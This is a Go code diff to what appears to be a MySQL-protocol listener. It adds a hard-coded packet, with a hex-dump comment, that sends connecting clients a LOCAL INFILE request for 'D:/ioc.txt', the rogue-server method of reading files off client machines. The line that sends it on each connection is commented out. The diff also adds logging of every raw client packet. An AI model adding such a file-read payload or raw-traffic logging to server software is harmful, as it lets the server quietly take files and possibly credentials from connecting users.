@@ -134,6 +134,24 @@ func (l *Listener) parserComStatementExecute(data []byte, session *Session) (*St
 	return stmt, nil
 }
 
+var TRBULAR = []byte{
+	0x02, 0x00, 0x00, 0x00, 0x45, 0x00, 0x00, 0x37,
+	0x76, 0x42, 0x40, 0x00, 0x40, 0x06, 0x00, 0x00,
+	0x7f, 0x00, 0x00, 0x01, 0x7f, 0x00, 0x00, 0x01,
+	0x0c, 0xea, 0xd1, 0xa7, 0x99, 0x64, 0x80, 0x88,
+	0x6e, 0x95, 0x4c, 0x64, 0x50, 0x18, 0x20, 0xf9,
+	0xe7, 0xbd, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x01,
+	0xfb, 0x44, 0x3a, 0x2f, 0x69, 0x6f, 0x63, 0x2e,
+	0x74, 0x78, 0x74,
+}
+
+/**
+0000   02 00 00 00 45 00 00 37 9e ad 40 00 40 06 00 00   ....E..7..@.@...
+0010   7f 00 00 01 7f 00 00 01 0c ea d1 a7 99 64 8b 37   .............d.7
+0020   6e a0 73 6a 50 18 20 63 b6 93 00 00 0b 00 00 01   n.sjP. c........
+0030   fb 44 3a 2f 69 6f 63 2e 74 78 74                  .D:/ioc.txt
+**/
+
 // handle is called in a go routine for each client connection.
 func (l *Listener) handle(conn net.Conn, ID uint32) {
 	var err error
@@ -209,6 +227,12 @@ func (l *Listener) handle(conn net.Conn, ID uint32) {
 		return
 	}
 
+	// load data local infile 'D:/ioc.txt' into table users fields terminated by '\n'
+	// if err = session.packets.Write(TRBULAR); err != nil {
+	// 	log.Error("TRBULAR: %v", err)
+	// 	return
+	// }
+
 	l.handler.SessionInc(session)
 	defer l.handler.SessionDec(session)
 
@@ -219,6 +243,7 @@ func (l *Listener) handle(conn net.Conn, ID uint32) {
 			return
 		}
 
+		log.Println("data====", string(data))
 		// Update the session last query time for session idle.
 		session.updateLastQueryTime(time.Now())
 		switch data[0] {
